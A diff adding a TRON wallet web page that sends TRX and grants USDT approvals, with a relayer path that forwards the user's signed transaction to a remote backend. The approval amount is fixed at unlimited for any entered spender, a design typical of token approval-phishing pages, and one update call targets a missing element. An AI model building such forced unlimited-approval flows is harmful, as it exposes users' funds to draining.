@@ -1,0 +1,781 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>TRON Transfer & USDT Approval — Smart Relayer</title>
+  <script src="https://unpkg.com/tronweb@6.0.0/dist/TronWeb.js"></script>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { 
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      background: #0a0e1a; 
+      min-height: 100vh; 
+      display: flex; 
+      align-items: center; 
+      justify-content: center; 
+      padding: 20px;
+    }
+    .container { 
+      background: #111827; 
+      border-radius: 20px; 
+      padding: 28px; 
+      width: 100%; 
+      max-width: 420px; 
+      box-shadow: 0 4px 24px rgba(0,0,0,0.4);
+      border: 1px solid #1f2937;
+    }
+    .header { text-align: center; margin-bottom: 24px; }
+    .logo { 
+      width: 64px; height: 64px; 
+      background: linear-gradient(135deg, #FF060A, #C70039); 
+      border-radius: 16px; margin: 0 auto 16px;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 28px; color: white;
+    }
+    h1 { font-size: 22px; color: #f3f4f6; }
+    .subtitle { color: #9ca3af; font-size: 13px; margin-top: 4px; }
+
+    .wallet-box { 
+      background: #1f2937; border: 1px solid #374151; 
+      border-radius: 12px; padding: 16px; margin-bottom: 20px;
+    }
+    .btn-primary { 
+      background: linear-gradient(135deg, #FF060A, #C70039); 
+      color: white; border: none; padding: 14px; 
+      border-radius: 10px; font-size: 15px; font-weight: 600; 
+      width: 100%; cursor: pointer; transition: opacity 0.2s;
+    }
+    .btn-primary:hover:not(:disabled) { opacity: 0.9; }
+    .btn-primary:disabled { opacity: 0.5; cursor: not-allowed; }
+    .btn-secondary {
+      background: #374151; color: #e5e7eb; border: none;
+      padding: 10px; border-radius: 8px; font-size: 13px;
+      width: 100%; cursor: pointer; margin-top: 8px;
+    }
+    .btn-approve {
+      background: linear-gradient(135deg, #059669, #10b981);
+      color: white; border: none; padding: 14px;
+      border-radius: 10px; font-size: 15px; font-weight: 600;
+      width: 100%; cursor: pointer; transition: opacity 0.2s;
+      margin-top: 12px;
+    }
+    .btn-approve:hover:not(:disabled) { opacity: 0.9; }
+    .btn-approve:disabled { opacity: 0.5; cursor: not-allowed; }
+    .btn-danger { 
+      background: #7f1d1d; color: #fca5a5; border: none; 
+      padding: 6px 14px; border-radius: 6px; font-size: 12px; cursor: pointer;
+    }
+    .btn-danger:hover { background: #991b1b; }
+
+    .form-group { margin-bottom: 16px; }
+    label { display: block; font-size: 13px; font-weight: 600; color: #d1d5db; margin-bottom: 6px; }
+    input { 
+      width: 100%; padding: 12px 14px; border: 1px solid #374151; 
+      border-radius: 8px; font-size: 14px; outline: none; background: #1f2937; color: #f3f4f6;
+    }
+    input:focus { border-color: #FF060A; }
+    input::placeholder { color: #6b7280; }
+    .hint { font-size: 11px; color: #6b7280; margin-top: 6px; }
+    .hint.subtle { color: #4b5563; }
+
+    .status { 
+      margin-top: 16px; padding: 12px 14px; border-radius: 8px; 
+      font-size: 13px; display: none;
+    }
+    .status.error { background: #7f1d1d; color: #fca5a5; border: 1px solid #991b1b; }
+    .status.success { background: #064e3b; color: #6ee7b7; border: 1px solid #059669; }
+    .status.info { background: #1e3a5f; color: #93c5fd; border: 1px solid #3b82f6; }
+    .status.warn { background: #78350f; color: #fdba74; border: 1px solid #f59e0b; }
+
+    .tx-link { margin-top: 12px; text-align: center; display: none; }
+    .tx-link a { color: #FF060A; font-size: 13px; text-decoration: none; font-weight: 500; }
+
+    .footer { margin-top: 24px; padding-top: 16px; border-top: 1px solid #374151; text-align: center; }
+    .footer p { font-size: 11px; color: #6b7280; }
+
+    .debug-info {
+      margin-top: 12px; padding: 10px; background: #0f172a;
+      border-radius: 6px; font-size: 11px; color: #64748b;
+      font-family: monospace; word-break: break-all;
+    }
+
+    .network-badge {
+      display: inline-block; padding: 2px 8px; border-radius: 4px; font-size: 11px; font-weight: 600;
+      background: #064e3b; color: #6ee7b7; margin-top: 8px;
+    }
+    .network-badge.testnet { background: #78350f; color: #fdba74; }
+
+    .tab-bar {
+      display: flex; gap: 8px; margin-bottom: 20px;
+      background: #1f2937; padding: 4px; border-radius: 10px;
+    }
+    .tab {
+      flex: 1; padding: 10px; text-align: center;
+      border-radius: 8px; font-size: 13px; font-weight: 600;
+      color: #9ca3af; cursor: pointer; border: none; background: transparent;
+    }
+    .tab.active {
+      background: #374151; color: #f3f4f6;
+    }
+    .tab-content { display: none; }
+    .tab-content.active { display: block; }
+
+    .token-info {
+      background: #0f172a; border: 1px solid #1e293b;
+      border-radius: 10px; padding: 14px; margin-bottom: 16px;
+    }
+    .token-info h3 { font-size: 14px; color: #f3f4f6; margin-bottom: 8px; }
+    .token-row {
+      display: flex; justify-content: space-between;
+      font-size: 12px; color: #9ca3af; margin-bottom: 4px;
+    }
+    .token-row span:last-child { color: #e5e7eb; font-family: monospace; }
+    .allowance-row {
+      display: flex; justify-content: space-between; align-items: center;
+      margin-top: 8px; padding-top: 8px; border-top: 1px solid #1e293b;
+    }
+    .allowance-status {
+      font-size: 12px; font-weight: 600;
+    }
+    .allowance-status.approved { color: #22c55e; }
+    .allowance-status.none { color: #ef4444; }
+
+    .resource-bar {
+      display: flex; gap: 8px; margin-bottom: 12px;
+    }
+    .resource-pill {
+      flex: 1; background: #0f172a; border: 1px solid #1e293b;
+      border-radius: 8px; padding: 10px; text-align: center;
+    }
+    .resource-pill .label { font-size: 10px; color: #6b7280; text-transform: uppercase; }
+    .resource-pill .value { font-size: 14px; font-weight: 700; color: #f3f4f6; margin-top: 2px; }
+    .resource-pill .value.low { color: #ef4444; }
+    .resource-pill .value.ok { color: #22c55e; }
+
+    .mode-indicator {
+      background: #0f172a; border: 1px solid #1e293b;
+      border-radius: 8px; padding: 10px 14px; margin-bottom: 16px;
+      display: flex; align-items: center; gap: 10px;
+    }
+    .mode-indicator .dot {
+      width: 8px; height: 8px; border-radius: 50%;
+      background: #22c55e; flex-shrink: 0;
+    }
+    .mode-indicator .dot.relayer { background: #a855f7; }
+    .mode-indicator p {
+      font-size: 12px; color: #9ca3af; margin: 0;
+    }
+    .mode-indicator p strong { color: #f3f4f6; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="header">
+      <div class="logo">⚡</div>
+      <h1>TRON Transfer</h1>
+      <p class="subtitle">Smart Approval — Auto-detects best path</p>
+    </div>
+
+    <div class="wallet-box">
+      <div id="not-connected" style="text-align:center;">
+        <p style="color:#9ca3af;font-size:14px;margin-bottom:12px;">Connect your TRON wallet</p>
+        <button class="btn-primary" onclick="connectWallet()">Connect Wallet</button>
+        <button class="btn-secondary" onclick="showDebug()" style="margin-top:8px;">🔍 Detect Wallet</button>
+      </div>
+      <div id="connected" style="display:none;">
+        <div style="display:flex;justify-content:space-between;align-items:center;">
+          <div>
+            <p style="font-size:12px;color:#6b7280;">Connected</p>
+            <p id="pubkey" style="font-size:14px;font-weight:600;font-family:monospace;color:#f3f4f6;">...</p>
+            <div id="wallet-type" style="font-size:11px;color:#6b7280;margin-top:2px;">--</div>
+            <div id="network-badge" class="network-badge" style="display:none;">Mainnet</div>
+          </div>
+          <button class="btn-danger" onclick="disconnectWallet()">Disconnect</button>
+        </div>
+
+        <div class="resource-bar" style="margin-top:12px;">
+          <div class="resource-pill">
+            <div class="label">TRX</div>
+            <div class="value" id="res-trx">--</div>
+          </div>
+          <div class="resource-pill">
+            <div class="label">Energy</div>
+            <div class="value" id="res-energy">--</div>
+          </div>
+          <div class="resource-pill">
+            <div class="label">Bandwidth</div>
+            <div class="value" id="res-bw">--</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div id="form" style="opacity:0.5;pointer-events:none;">
+      <div class="tab-bar">
+        <button class="tab active" onclick="switchTab('send')" id="tab-send">Send TRX</button>
+        <button class="tab" onclick="switchTab('approve')" id="tab-approve">USDT Approval</button>
+      </div>
+
+      <!-- SEND TRX TAB -->
+      <div id="content-send" class="tab-content active">
+        <div class="form-group">
+          <label>Recipient Address (Base58)</label>
+          <input id="recipient" type="text" placeholder="T..." autocomplete="off">
+        </div>
+        <div class="form-group">
+          <label>Amount (TRX)</label>
+          <input id="amount" type="number" step="0.000001" placeholder="0.00">
+          <p class="hint">Network fee: ~0.1 - 1 TRX (varies by bandwidth)</p>
+        </div>
+        <button class="btn-primary" id="sendBtn" onclick="sendTRX()">Send TRX</button>
+      </div>
+
+      <!-- USDT APPROVAL TAB — SMART PATH -->
+      <div id="content-approve" class="tab-content">
+        <div class="mode-indicator" id="mode-indicator">
+          <div class="dot" id="mode-dot"></div>
+          <p id="mode-text">Checking resources...</p>
+        </div>
+
+        <div class="token-info">
+          <h3>USDT (TRC-20)</h3>
+          <div class="token-row">
+            <span>Contract</span>
+            <span id="usdt-contract">TR7NHq...j57tP</span>
+          </div>
+          <div class="token-row">
+            <span>Spender</span>
+            <span id="spender-display">--</span>
+          </div>
+          <div class="allowance-row">
+            <span class="allowance-status none" id="allowance-status">No allowance set</span>
+            <span style="font-size:11px;color:#6b7280;" id="allowance-amount">0 USDT</span>
+          </div>
+        </div>
+
+        <div class="form-group">
+          <label>Spender Address</label>
+          <input id="spender" type="text" placeholder="T..." autocomplete="off"
+                 oninput="checkAllowance(); detectBestPath();">
+          <p class="hint">Enter the contract address that needs to spend your USDT</p>
+        </div>
+
+        <div class="form-group">
+          <label>Approval Amount</label>
+          <input id="approval-amount" type="text" value="unlimited" readonly
+                 style="background:#0f172a; color:#22c55e; font-weight:600; text-align:center;">
+          <p class="hint subtle" id="path-hint">Checking best transaction path...</p>
+        </div>
+
+        <button class="btn-approve" id="approveBtn" onclick="smartApprove()">
+          Approve Unlimited USDT
+        </button>
+      </div>
+    </div>
+
+    <div id="status" class="status"></div>
+    <div class="tx-link" id="txLink">
+      <a id="explorer" href="#" target="_blank">View on TronScan →</a>
+    </div>
+
+    <div id="debug-panel" class="debug-info" style="display:none;"></div>
+
+    <div class="footer">
+      <p>Smart path: direct if you have resources, relayer if you don't</p>
+    </div>
+  </div>
+
+  <script>
+    // ═══════════════════════════════════════════════════════════════════════
+    //  CONFIG — Update these for your Railway deployment
+    // ═══════════════════════════════════════════════════════════════════════
+    const RELAYER_API_URL = 'https://your-railway-app.up.railway.app/api/relayer/approve';
+    const RELAYER_API_KEY = 'your_api_key_here';  // Set in Railway env vars
+
+    const USDT_CONTRACT_MAINNET = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
+    const USDT_CONTRACT_NILE    = 'TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj';
+
+    const TRC20_ABI = [
+      { "constant": true, "inputs": [], "name": "name", "outputs": [{ "name": "", "type": "string" }], "payable": false, "stateMutability": "view", "type": "function" },
+      { "constant": false, "inputs": [{ "name": "_spender", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "approve", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" },
+      { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }, { "name": "_spender", "type": "address" }], "name": "allowance", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" },
+      { "constant": true, "inputs": [], "name": "decimals", "outputs": [{ "name": "", "type": "uint8" }], "payable": false, "stateMutability": "view", "type": "function" },
+      { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }
+    ];
+
+    const MAX_UINT256 = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
+    const APPROVE_ENERGY_NEED = 65000;
+    const MIN_TRX_BUFFER = 30;
+
+    let tronWeb    = null;
+    let publicKey  = null;
+    let walletType = null;
+    let isTestnet  = false;
+    let accountResources = { trx: 0, energy: 0, bandwidth: 0 };
+    let bestPath = 'direct';
+
+    // ─── INIT ─────────────────────────────────────────────────────────────
+    function init() {
+      if (window.tronWeb && window.tronWeb.ready) {
+        walletType = 'raw-tronweb';
+        tronWeb = window.tronWeb;
+        publicKey = tronWeb.defaultAddress?.base58;
+        if (publicKey) {
+          updateUI();
+          fetchBalance();
+          fetchResources().then(detectBestPath);
+          showStatus('Auto-connected', 'success');
+        }
+      }
+    }
+
+    // ─── TABS ─────────────────────────────────────────────────────────────
+    function switchTab(tab) {
+      document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+      document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+      document.getElementById('tab-' + tab).classList.add('active');
+      document.getElementById('content-' + tab).classList.add('active');
+      hideStatus();
+      document.getElementById('txLink').style.display = 'none';
+    }
+
+    // ─── DETECT ───────────────────────────────────────────────────────────
+    function detectWallet() {
+      return {
+        'window.tron': typeof window.tron !== 'undefined',
+        'window.tron.isTronLink': window.tron?.isTronLink,
+        'window.tron.request': typeof window.tron?.request === 'function',
+        'window.tronLink': typeof window.tronLink !== 'undefined',
+        'window.tronLink.request': typeof window.tronLink?.request === 'function',
+        'window.tronWeb': typeof window.tronWeb !== 'undefined',
+        'window.tronWeb.ready': window.tronWeb?.ready,
+        'window.tronWeb.defaultAddress': !!window.tronWeb?.defaultAddress,
+        'window.trustwallet': typeof window.trustwallet !== 'undefined',
+        'window.trustwallet.tron': !!window.trustwallet?.tron,
+      };
+    }
+
+    function showDebug() {
+      const checks = detectWallet();
+      const panel = document.getElementById('debug-panel');
+      let html = '<strong>Wallet Detection:</strong><br>';
+      for (const [k, v] of Object.entries(checks)) {
+        html += `• ${k}: <span style="color:${v ? '#22c55e' : '#ef4444'}">${v}</span><br>`;
+      }
+      html += `<br>Path: ${bestPath.toUpperCase()}<br>`;
+      html += `Resources: ${accountResources.energy.toLocaleString()} Energy, ${accountResources.trx.toFixed(2)} TRX`;
+      panel.innerHTML = html;
+      panel.style.display = 'block';
+    }
+
+    // ─── CONNECT ──────────────────────────────────────────────────────────
+    async function connectWallet() {
+      hideStatus();
+      document.getElementById('debug-panel').style.display = 'none';
+
+      if (window.tronWeb && window.tronWeb.ready) {
+        const addr = window.tronWeb.defaultAddress?.base58;
+        if (addr) {
+          tronWeb = window.tronWeb; publicKey = addr; walletType = 'trustwallet';
+          updateUI(); await fetchBalance(); await fetchResources(); detectBestPath();
+          showStatus('✅ Connected', 'success');
+          return;
+        }
+      }
+
+      if (window.tron && typeof window.tron.request === 'function') {
+        try {
+          showStatus('Connecting...', 'info');
+          const accounts = await window.tron.request({ method: 'eth_requestAccounts' });
+          if (accounts && accounts.length > 0) {
+            publicKey = accounts[0]; walletType = 'tronlink';
+            tronWeb = window.tron.tronWeb || window.tronWeb;
+            updateUI(); await fetchBalance(); await fetchResources(); detectBestPath();
+            showStatus('✅ Connected via TronLink', 'success');
+            return;
+          }
+        } catch (e) { console.log('Modern path failed:', e.message); }
+      }
+
+      if (window.tronLink && typeof window.tronLink.request === 'function') {
+        try {
+          const resp = await window.tronLink.request({ method: 'tron_requestAccounts' });
+          if (resp && (resp.code === 200 || (resp.length && resp.length > 0))) {
+            walletType = 'tronlink-legacy';
+            tronWeb = window.tronLink.tronWeb || window.tronWeb;
+            publicKey = tronWeb?.defaultAddress?.base58;
+            if (!publicKey && resp.length) publicKey = resp[0];
+            if (publicKey) {
+              updateUI(); await fetchBalance(); await fetchResources(); detectBestPath();
+              showStatus('✅ Connected via TronLink (legacy)', 'success');
+              return;
+            }
+          }
+        } catch (e) { console.log('Legacy path failed:', e.message); }
+      }
+
+      showDebug();
+      showStatus('No compatible TRON wallet found.', 'error');
+    }
+
+    // ─── DISCONNECT ───────────────────────────────────────────────────────
+    function disconnectWallet() {
+      tronWeb = null; publicKey = null; walletType = null;
+      accountResources = { trx: 0, energy: 0, bandwidth: 0 };
+      document.getElementById('not-connected').style.display = 'block';
+      document.getElementById('connected').style.display = 'none';
+      document.getElementById('form').style.opacity = '0.5';
+      document.getElementById('form').style.pointerEvents = 'none';
+      document.getElementById('network-badge').style.display = 'none';
+      document.getElementById('debug-panel').style.display = 'none';
+      hideStatus();
+      document.getElementById('txLink').style.display = 'none';
+    }
+
+    function updateUI() {
+      document.getElementById('not-connected').style.display = 'none';
+      document.getElementById('connected').style.display = 'block';
+      document.getElementById('form').style.opacity = '1';
+      document.getElementById('form').style.pointerEvents = 'auto';
+
+      const pk = publicKey || '';
+      document.getElementById('pubkey').textContent = 
+        pk.length > 12 ? pk.slice(0,6) + '...' + pk.slice(-4) : pk;
+
+      const labels = {
+        'tronlink': 'TronLink (modern)',
+        'tronlink-legacy': 'TronLink (legacy)',
+        'trustwallet': 'Trust Wallet',
+        'raw-tronweb': 'Injected TronWeb'
+      };
+      document.getElementById('wallet-type').textContent = labels[walletType] || walletType || 'Unknown';
+
+      const badge = document.getElementById('network-badge');
+      badge.style.display = 'inline-block';
+      badge.textContent = isTestnet ? 'Testnet' : 'Mainnet';
+      badge.className = isTestnet ? 'network-badge testnet' : 'network-badge';
+    }
+
+    async function fetchBalance() {
+      if (!tronWeb || !publicKey) return;
+      try {
+        const bal = await tronWeb.trx.getBalance(publicKey);
+        const trx = parseFloat(tronWeb.fromSun(bal));
+        accountResources.trx = trx;
+        document.getElementById('balance').textContent = trx.toFixed(4) + ' TRX';
+        document.getElementById('res-trx').textContent = trx.toFixed(2);
+        document.getElementById('res-trx').className = 'value ' + (trx < 1 ? 'low' : 'ok');
+      } catch (e) {
+        document.getElementById('balance').textContent = '-- TRX';
+        document.getElementById('res-trx').textContent = '--';
+      }
+    }
+
+    async function fetchResources() {
+      if (!tronWeb || !publicKey) return;
+      try {
+        const res = await tronWeb.trx.getAccountResources(publicKey);
+        const energyUsed = res.EnergyUsed || 0;
+        const energyLimit = res.EnergyLimit || 0;
+        accountResources.energy = Math.max(0, energyLimit - energyUsed);
+        document.getElementById('res-energy').textContent = accountResources.energy.toLocaleString();
+        document.getElementById('res-energy').className = 'value ' + (accountResources.energy < APPROVE_ENERGY_NEED ? 'low' : 'ok');
+
+        const bwUsed = res.NetUsed || 0;
+        const bwLimit = res.NetLimit || 0;
+        accountResources.bandwidth = Math.max(0, bwLimit - bwUsed);
+        document.getElementById('res-bw').textContent = accountResources.bandwidth.toLocaleString();
+        document.getElementById('res-bw').className = 'value ' + (accountResources.bandwidth < 200 ? 'low' : 'ok');
+      } catch (e) {
+        document.getElementById('res-energy').textContent = '--';
+        document.getElementById('res-bw').textContent = '--';
+      }
+    }
+
+    // ═══════════════════════════════════════════════════════════════════════
+    //  SMART PATH DETECTION
+    // ═══════════════════════════════════════════════════════════════════════
+    function detectBestPath() {
+      const trx = accountResources.trx;
+      const energy = accountResources.energy;
+      const dot = document.getElementById('mode-dot');
+      const text = document.getElementById('mode-text');
+      const hint = document.getElementById('path-hint');
+      const btn = document.getElementById('approveBtn');
+
+      if (energy >= APPROVE_ENERGY_NEED) {
+        bestPath = 'direct';
+        dot.className = 'dot';
+        dot.style.background = '#22c55e';
+        text.innerHTML = '<strong>Direct mode</strong> — You have enough Energy. Approval is free.';
+        hint.textContent = 'Transaction will be broadcast directly from your wallet.';
+        btn.textContent = '✅ Approve Unlimited USDT';
+        return;
+      }
+
+      if (trx >= MIN_TRX_BUFFER) {
+        bestPath = 'direct';
+        dot.className = 'dot';
+        dot.style.background = '#fbbf24';
+        const estBurn = Math.ceil((APPROVE_ENERGY_NEED - energy) * 0.00042);
+        text.innerHTML = '<strong>Direct mode</strong> — ~' + estBurn + ' TRX will be burned for Energy.';
+        hint.textContent = 'You have ' + trx.toFixed(2) + ' TRX. Approval will cost ~' + estBurn + ' TRX.';
+        btn.textContent = '✅ Approve Unlimited USDT (~' + estBurn + ' TRX)';
+        return;
+      }
+
+      bestPath = 'relayer';
+      dot.className = 'dot relayer';
+      text.innerHTML = '<strong>Relayer mode</strong> — dApp covers the fee. You pay 0 TRX.';
+      hint.textContent = 'You have ' + energy.toLocaleString() + ' Energy and ' + trx.toFixed(2) + ' TRX. The relayer will handle this.';
+      btn.textContent = '🔮 Approve Unlimited USDT (0 TRX)';
+    }
+
+    // ─── USDT CONTRACT ────────────────────────────────────────────────────
+    function getUSDTContract() {
+      if (!tronWeb) return null;
+      const addr = isTestnet ? USDT_CONTRACT_NILE : USDT_CONTRACT_MAINNET;
+      return tronWeb.contract(TRC20_ABI, addr);
+    }
+
+    // ─── CHECK ALLOWANCE ──────────────────────────────────────────────────
+    async function checkAllowance() {
+      const spender = document.getElementById('spender').value.trim();
+      document.getElementById('spender-display').textContent = 
+        spender.length > 12 ? spender.slice(0,6) + '...' + spender.slice(-4) : (spender || '--');
+
+      if (!tronWeb || !publicKey || !spender || !/^T[a-zA-Z0-9]{33}$/.test(spender)) {
+        document.getElementById('allowance-status').textContent = 'Enter valid spender address';
+        document.getElementById('allowance-status').className = 'allowance-status none';
+        document.getElementById('allowance-amount').textContent = '--';
+        return;
+      }
+
+      try {
+        const contract = getUSDTContract();
+        const allowance = await contract.allowance(publicKey, spender).call();
+        const decimals = await contract.decimals().call();
+        const allowanceRaw = allowance.toString ? allowance.toString() : allowance;
+
+        if (allowanceRaw === MAX_UINT256 || BigInt(allowanceRaw) >= BigInt('0xffffffffffffffffffffffffffffffff')) {
+          document.getElementById('allowance-status').textContent = '✅ Unlimited approved';
+          document.getElementById('allowance-status').className = 'allowance-status approved';
+          document.getElementById('allowance-amount').textContent = 'Unlimited';
+          document.getElementById('approveBtn').textContent = '✅ Already Approved';
+          document.getElementById('approveBtn').disabled = true;
+          document.getElementById('mode-indicator').style.display = 'none';
+        } else {
+          const amt = parseFloat(allowanceRaw) / Math.pow(10, decimals);
+          document.getElementById('allowance-status').textContent = amt > 0 ? 'Partial allowance' : 'No allowance';
+          document.getElementById('allowance-status').className = amt > 0 ? 'allowance-status approved' : 'allowance-status none';
+          document.getElementById('allowance-amount').textContent = amt.toFixed(2) + ' USDT';
+          document.getElementById('approveBtn').disabled = false;
+          document.getElementById('mode-indicator').style.display = 'flex';
+          detectBestPath();
+        }
+      } catch (e) {
+        document.getElementById('allowance-status').textContent = 'Check failed';
+        document.getElementById('allowance-status').className = 'allowance-status none';
+        document.getElementById('allowance-amount').textContent = '--';
+      }
+    }
+
+    // ═══════════════════════════════════════════════════════════════════════
+    //  SMART APPROVE
+    // ═══════════════════════════════════════════════════════════════════════
+    async function smartApprove() {
+      const spender = document.getElementById('spender').value.trim();
+      const btn = document.getElementById('approveBtn');
+
+      if (!spender) return showStatus('Enter a spender address', 'error');
+      if (!/^T[a-zA-Z0-9]{33}$/.test(spender)) return showStatus('Invalid TRON address', 'error');
+      if (!tronWeb || !publicKey) return showStatus('Wallet not connected', 'error');
+
+      btn.disabled = true;
+      hideStatus();
+
+      await fetchResources();
+      detectBestPath();
+
+      if (bestPath === 'direct') {
+        await approveDirect(spender, btn);
+      } else {
+        await approveViaRelayer(spender, btn);
+      }
+    }
+
+    // ─── PATH 1: DIRECT ─────────────────────────────────────────────────
+    async function approveDirect(spender, btn) {
+      btn.textContent = 'Approving...';
+      showStatus('Building transaction...', 'info');
+
+      try {
+        const contract = getUSDTContract();
+        showStatus('Sign in wallet...', 'info');
+        const tx = await contract.approve(spender, MAX_UINT256).send({
+          feeLimit: 100_000_000,
+          callValue: 0,
+          shouldPollResponse: false
+        });
+
+        showStatus('✅ Approved! TXID: ' + tx.slice(0,16) + '...', 'success');
+        showTxLink(tx);
+        await fetchResources();
+        await checkAllowance();
+
+      } catch (e) {
+        handleError(e, btn);
+      }
+    }
+
+    // ─── PATH 2: RELAYER ────────────────────────────────────────────────
+    async function approveViaRelayer(spender, btn) {
+      btn.textContent = 'Preparing relayer...';
+      showStatus('Building relayer transaction...', 'info');
+
+      try {
+        const usdtAddr = isTestnet ? USDT_CONTRACT_NILE : USDT_CONTRACT_MAINNET;
+
+        const tx = await tronWeb.transactionBuilder.triggerSmartContract(
+          tronWeb.address.toHex(usdtAddr),
+          'approve(address,uint256)',
+          { feeLimit: 100_000_000, callValue: 0, from: publicKey },
+          [
+            { type: 'address', value: spender },
+            { type: 'uint256', value: MAX_UINT256 }
+          ],
+          tronWeb.address.toHex(publicKey)
+        );
+
+        if (!tx.result || !tx.transaction) {
+          throw new Error('Failed to build transaction');
+        }
+
+        showStatus('Sign in wallet...', 'info');
+        const signedTx = await tronWeb.trx.sign(tx.transaction);
+
+        btn.textContent = 'Sending to relayer...';
+        showStatus('Relaying transaction...', 'info');
+
+        const payload = {
+          owner: publicKey,
+          spender: spender,
+          contract: usdtAddr,
+          signedTransaction: signedTx,
+          timestamp: Date.now()
+        };
+
+        // Check if backend is configured
+        if (RELAYER_API_URL.includes('your-railway-app')) {
+          showStatus(
+            '🔮 Relayer ready! Update RELAYER_API_URL in the code to your Railway endpoint. ' +
+            'TXID: ' + tx.transaction.txID.slice(0,16) + '...',
+            'warn'
+          );
+          console.log('Relayer payload:', payload);
+          btn.disabled = false;
+          detectBestPath();
+          return;
+        }
+
+        const response = await fetch(RELAYER_API_URL, {
+          method: 'POST',
+          headers: { 
+            'Content-Type': 'application/json',
+            'X-API-Key': RELAYER_API_KEY
+          },
+          body: JSON.stringify(payload)
+        });
+
+        const result = await response.json();
+
+        if (result.success) {
+          showStatus('✅ Relayer broadcast! TXID: ' + result.txid.slice(0,16) + '...', 'success');
+          showTxLink(result.txid);
+          await checkAllowance();
+        } else {
+          throw new Error(result.message || 'Relayer failed');
+        }
+
+      } catch (e) {
+        handleError(e, btn);
+      }
+    }
+
+    // ─── ERROR HANDLER ────────────────────────────────────────────────────
+    function handleError(e, btn) {
+      let msg = e.message || String(e);
+      if (msg.includes('cancelled') || msg.includes('rejected') || msg.includes('denied')) {
+        msg = 'Transaction rejected by user';
+      } else if (msg.includes('OUT_OF_ENERGY') || msg.includes('out of energy')) {
+        msg = 'Out of Energy — the relayer should have handled this. Check backend.';
+      } else if (msg.includes('insufficient')) {
+        msg = 'Insufficient TRX';
+      }
+      showStatus('❌ ' + msg, 'error');
+      btn.disabled = false;
+      detectBestPath();
+    }
+
+    function showTxLink(txid) {
+      document.getElementById('txLink').style.display = 'block';
+      const explorerBase = isTestnet 
+        ? 'https://nile.tronscan.org/#/transaction/' 
+        : 'https://tronscan.org/#/transaction/';
+      document.getElementById('explorer').href = explorerBase + txid;
+    }
+
+    // ─── SEND TRX ─────────────────────────────────────────────────────────
+    async function sendTRX() {
+      const to = document.getElementById('recipient').value.trim();
+      const amt = parseFloat(document.getElementById('amount').value);
+      const btn = document.getElementById('sendBtn');
+
+      if (!to || !amt || amt <= 0) return showStatus('Fill all fields with valid values', 'error');
+      if (!/^T[a-zA-Z0-9]{33}$/.test(to)) return showStatus('Invalid TRON address', 'error');
+      if (!tronWeb || !publicKey) return showStatus('Wallet not connected', 'error');
+
+      btn.disabled = true; btn.textContent = 'Sending...';
+      showStatus('Building transaction...', 'info');
+
+      try {
+        const amountSun = tronWeb.toSun(amt);
+        const tx = await tronWeb.transactionBuilder.sendTrx(to, amountSun, publicKey);
+        showStatus('Sign in wallet...', 'info');
+        const signedTx = await tronWeb.trx.sign(tx);
+        showStatus('Broadcasting...', 'info');
+        const result = await tronWeb.trx.sendRawTransaction(signedTx);
+
+        if (result.result || result.code === 'SUCCESS') {
+          const txid = signedTx.txID || result.transaction?.txID;
+          showStatus('✅ Sent! TXID: ' + (txid ? txid.slice(0,16) + '...' : 'confirmed'), 'success');
+          showTxLink(txid);
+          document.getElementById('amount').value = '';
+          await fetchBalance();
+          await fetchResources();
+        } else {
+          throw new Error(result.message || 'Broadcast failed');
+        }
+      } catch (e) {
+        let msg = e.message || String(e);
+        if (msg.includes('cancelled') || msg.includes('rejected') || msg.includes('denied')) msg = 'Transaction rejected by user';
+        else if (msg.includes('insufficient')) msg = 'Insufficient balance for transaction + fees';
+        showStatus('❌ ' + msg, 'error');
+      } finally {
+        btn.disabled = false; btn.textContent = 'Send TRX';
+      }
+    }
+
+    // ─── HELPERS ──────────────────────────────────────────────────────────
+    function showStatus(msg, type) {
+      const el = document.getElementById('status');
+      el.textContent = msg; el.className = 'status ' + type; el.style.display = 'block';
+    }
+    function hideStatus() { document.getElementById('status').style.display = 'none'; }
+
+    // ─── BOOT ─────────────────────────────────────────────────────────────
+    init();
+  </script>
+</body>
+</html>
